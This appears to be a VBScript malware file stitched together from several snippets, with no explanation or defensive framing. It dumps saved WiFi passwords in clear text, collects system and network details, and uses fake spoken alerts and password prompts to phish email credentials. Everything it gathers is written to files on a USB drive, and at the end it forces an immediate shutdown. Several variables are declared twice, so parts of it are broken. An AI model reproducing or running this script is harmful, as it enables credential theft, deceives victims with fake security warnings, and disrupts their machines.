Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Change this to the drive letter of your USB
usbDrive = "D:\"

' Create/Open the file to save WiFi passwords
Set objFile = objFSO.CreateTextFile(usbDrive & "WiFi_Passwords.txt", True)

' Get the list of WiFi profiles
Set objExec = objShell.Exec("netsh wlan show profiles")
Do Until objExec.StdOut.AtEndOfStream
    strLine = objExec.StdOut.ReadLine()
    If InStr(strLine, "All User Profile") Then
        profileName = Split(strLine, ":")(1)
        profileName = Trim(profileName)
        
        ' Get the password for each profile
        Set objExecProfile = objShell.Exec("netsh wlan show profile name=""" & profileName & """ key=clear")
        Do Until objExecProfile.StdOut.AtEndOfStream
            strProfileLine = objExecProfile.StdOut.ReadLine()
            If InStr(strProfileLine, "Key Content") Then
                password = Split(strProfileLine, ":")(1)
                password = Trim(password)
                objFile.WriteLine("Profile: " & profileName & " Password: " & password)
            End If
        Loop
    End If
Loop

objFile.Close

Dim objFSO, objFile
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile("D:\SystemInfo.txt", True)

' Get WMI service
Dim objWMIService, colItems, objItem
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

' Retrieve Operating System information
Set colItems = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
For Each objItem in colItems
    objFile.WriteLine "OS Name: " & objItem.Name
    objFile.WriteLine "Version: " & objItem.Version
    objFile.WriteLine "Manufacturer: " & objItem.Manufacturer
    objFile.WriteLine "Windows Directory: " & objItem.WindowsDirectory
    objFile.WriteLine "Locale: " & objItem.Locale
    objFile.WriteLine "Available Physical Memory: " & objItem.FreePhysicalMemory
    objFile.WriteLine "Total Virtual Memory: " & objItem.TotalVirtualMemorySize
    objFile.WriteLine "Available Virtual Memory: " & objItem.FreeVirtualMemory
Next

' Retrieve Computer System information
Set colItems = objWMIService.ExecQuery("Select * from Win32_ComputerSystem")
For Each objItem in colItems
    objFile.WriteLine "System Name: " & objItem.Name
    objFile.WriteLine "Manufacturer: " & objItem.Manufacturer
    objFile.WriteLine "Model: " & objItem.Model
    objFile.WriteLine "Total Physical Memory: " & objItem.TotalPhysicalMemory
Next

' Retrieve Processor information
Set colItems = objWMIService.ExecQuery("Select * from Win32_Processor")
For Each objItem in colItems
    objFile.WriteLine "Processor: " & objItem.Name
    objFile.WriteLine "Architecture: " & objItem.Architecture
Next

' Retrieve BIOS information
Set colItems = objWMIService.ExecQuery("Select * from Win32_BIOS")
For Each objItem in colItems
    objFile.WriteLine "BIOS Version: " & objItem.Version
Next

' Close the file
objFile.Close

Dim speech
Set speech = CreateObject("SAPI.SpVoice")

' Set the voice speed (-10 to 10)
speech.Rate = -2

' Set the volume (0 to 100)
speech.Volume = 50

' Text to be spoken
speech.Speak "akountt varification needed"  
WScript.Sleep 1000 '
speech.Speak "systems error 2.5 pending shuttdown"
WScript.Sleep 1000

Set fso = CreateObject("Scripting.FileSystemObject")

' Specify the path and name of the text file
filePath = "D:\w password.txt"

' Create or open the text file for writing
Set file = fso.CreateTextFile(filePath, True)

' Prompt the user for a password
assword = InputBox("Enter your password:", "Password Input")

' Write the password to the text file
file.WriteLine(assword)

' Close the text file
file.Close


' Create an input box for the username
Dim username
username = InputBox("Enter your email:", "Email")

' Create an input box for the password
Dim password
password = InputBox("Enter your password:", "Password")

' Save the username and password to a text file
Dim fso, file
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile("x_password.txt", True)
file.WriteLine("Email: " & username)
file.WriteLine("Password: " & password)
file.Close

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile("D:\ip_address.txt", True)

Set objShell = CreateObject("WScript.Shell")
Set objExec = objShell.Exec("ipconfig")

Do While Not objExec.StdOut.AtEndOfStream
    strLine = objExec.StdOut.ReadLine()
    If InStr(strLine, "IPv4 Address") > 0 Then
        arrParts = Split(strLine, ":")
        strIPAddress = Trim(arrParts(1))
        objFile.WriteLine("IP Address: " & strIPAddress)
    End If
Loop

objFile.Close

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")
Set objNetwork = CreateObject("WScript.Network")

' Get system information
strComputerName = objNetwork.ComputerName
strUserName = objNetwork.UserName
strOS = objShell.ExpandEnvironmentStrings("%OS%")
strProcessor = objShell.ExpandEnvironmentStrings("%PROCESSOR_IDENTIFIER%")

' Create a text file on the USB drive (assuming the USB drive is D:)
strFilePath = "D:\suckInfo.txt"
Set objFile = objFSO.CreateTextFile(strFilePath, True)

' Write system information to the text file
objFile.WriteLine "Computer Name: " & strComputerName
objFile.WriteLine "User Name: " & strUserName
objFile.WriteLine "Operating System: " & strOS
objFile.WriteLine "Processor: " & strProcessor

objFile.Close

speech.Speak "virus detected"  
WScript.Sleep 1000 '
speech.Speak "you've been hacked! systems files under attack"
WScript.Sleep 1000
speech.Speak "systems files deleted"
WScript.Sleep 1000
speech.Speak "Powering down! you dumb mother fucker"
WScript.Sleep 1000

Set shell = CreateObject("WScript.Shell")
shell.Run "cmd"
WScript.Sleep 1000
shell.SendKeys "shutdown -s -t 0" & "{ENTER}"

